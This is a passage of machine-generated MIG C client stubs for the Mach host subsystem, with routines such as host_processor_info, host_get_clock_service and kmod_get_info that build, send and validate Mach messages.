	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(202, "_host_page_size")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(202, "_host_page_size")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply___host_page_size_t__defined)
	check_result = __MIG_check__Reply___host_page_size_t((__Reply___host_page_size_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply___host_page_size_t__defined) */

	*out_page_size = Out0P->out_page_size;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__mach_memory_object_memory_entry_t__defined)
#define __MIG_check__Reply__mach_memory_object_memory_entry_t__defined

mig_internal kern_return_t __MIG_check__Reply__mach_memory_object_memory_entry_t(__Reply__mach_memory_object_memory_entry_t *Out0P)
{

	typedef __Reply__mach_memory_object_memory_entry_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 303) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->entry_handle.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->entry_handle.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__mach_memory_object_memory_entry_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine mach_memory_object_memory_entry */
mig_external kern_return_t mach_memory_object_memory_entry
(
	host_t host,
	boolean_t internal,
	vm_size_t size,
	vm_prot_t permission,
	memory_object_t pager,
	mach_port_t *entry_handle
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t pager;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		boolean_t internal;
		vm_size_t size;
		vm_prot_t permission;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t entry_handle;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t entry_handle;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__mach_memory_object_memory_entry_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__mach_memory_object_memory_entry_t__defined */

	__DeclareSendRpc(203, "mach_memory_object_memory_entry")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t pagerTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->pager = pagerTemplate;
	InP->pager.name = pager;
#else	/* UseStaticTemplates */
	InP->pager.name = pager;
	InP->pager.disposition = 19;
	InP->pager.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->internal = internal;

	InP->size = size;

	InP->permission = permission;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 203;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(203, "mach_memory_object_memory_entry")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(203, "mach_memory_object_memory_entry")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__mach_memory_object_memory_entry_t__defined)
	check_result = __MIG_check__Reply__mach_memory_object_memory_entry_t((__Reply__mach_memory_object_memory_entry_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__mach_memory_object_memory_entry_t__defined) */

	*entry_handle = Out0P->entry_handle.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_processor_info_t__defined)
#define __MIG_check__Reply__host_processor_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_processor_info_t(__Reply__host_processor_info_t *Out0P)
{

	typedef __Reply__host_processor_info_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 304) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->out_processor_info.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->out_processor_info.size / 4 != Out0P->out_processor_infoCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__host_processor_info_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_processor_info */
mig_external kern_return_t host_processor_info
(
	host_t host,
	processor_flavor_t flavor,
	natural_t *out_processor_count,
	processor_info_array_t *out_processor_info,
	mach_msg_type_number_t *out_processor_infoCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		processor_flavor_t flavor;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t out_processor_info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		natural_t out_processor_count;
		mach_msg_type_number_t out_processor_infoCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t out_processor_info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		natural_t out_processor_count;
		mach_msg_type_number_t out_processor_infoCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_processor_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_processor_info_t__defined */

	__DeclareSendRpc(204, "host_processor_info")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 204;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(204, "host_processor_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(204, "host_processor_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_processor_info_t__defined)
	check_result = __MIG_check__Reply__host_processor_info_t((__Reply__host_processor_info_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_processor_info_t__defined) */

	*out_processor_count = Out0P->out_processor_count;

	*out_processor_info = (processor_info_array_t)(Out0P->out_processor_info.address);
	*out_processor_infoCnt = Out0P->out_processor_infoCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_get_io_main_t__defined)
#define __MIG_check__Reply__host_get_io_main_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_get_io_main_t(__Reply__host_get_io_main_t *Out0P)
{

	typedef __Reply__host_get_io_main_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 305) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->io_main.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->io_main.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__host_get_io_main_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_get_io_main */
mig_external kern_return_t host_get_io_main
(
	host_t host,
	io_main_t *io_main
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t io_main;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t io_main;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_get_io_main_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_get_io_main_t__defined */

	__DeclareSendRpc(205, "host_get_io_main")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 205;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(205, "host_get_io_main")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(205, "host_get_io_main")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_get_io_main_t__defined)
	check_result = __MIG_check__Reply__host_get_io_main_t((__Reply__host_get_io_main_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_get_io_main_t__defined) */

	*io_main = Out0P->io_main.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_get_clock_service_t__defined)
#define __MIG_check__Reply__host_get_clock_service_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_get_clock_service_t(__Reply__host_get_clock_service_t *Out0P)
{

	typedef __Reply__host_get_clock_service_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 306) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->clock_serv.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->clock_serv.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__host_get_clock_service_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_get_clock_service */
mig_external kern_return_t host_get_clock_service
(
	host_t host,
	clock_id_t clock_id,
	clock_serv_t *clock_serv
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		clock_id_t clock_id;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t clock_serv;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t clock_serv;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_get_clock_service_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_get_clock_service_t__defined */

	__DeclareSendRpc(206, "host_get_clock_service")

	InP->NDR = NDR_record;

	InP->clock_id = clock_id;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 206;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(206, "host_get_clock_service")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(206, "host_get_clock_service")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_get_clock_service_t__defined)
	check_result = __MIG_check__Reply__host_get_clock_service_t((__Reply__host_get_clock_service_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_get_clock_service_t__defined) */

	*clock_serv = Out0P->clock_serv.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__kmod_get_info_t__defined)
#define __MIG_check__Reply__kmod_get_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__kmod_get_info_t(__Reply__kmod_get_info_t *Out0P)
{

	typedef __Reply__kmod_get_info_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 307) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->modules.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->modules.size != Out0P->modulesCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__kmod_get_info_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine kmod_get_info */
mig_external kern_return_t kmod_get_info
(
	host_t host,
	kmod_args_t *modules,
	mach_msg_type_number_t *modulesCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t modules;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t modulesCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t modules;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t modulesCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__kmod_get_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__kmod_get_info_t__defined */

	__DeclareSendRpc(207, "kmod_get_info")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 207;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(207, "kmod_get_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(207, "kmod_get_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__kmod_get_info_t__defined)
	check_result = __MIG_check__Reply__kmod_get_info_t((__Reply__kmod_get_info_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__kmod_get_info_t__defined) */

	*modules = (kmod_args_t)(Out0P->modules.address);
	*modulesCnt = Out0P->modulesCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_virtual_physical_table_info_t__defined)
#define __MIG_check__Reply__host_virtual_physical_table_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_virtual_physical_table_info_t(__Reply__host_virtual_physical_table_info_t *Out0P)
{

	typedef __Reply__host_virtual_physical_table_info_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 309) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
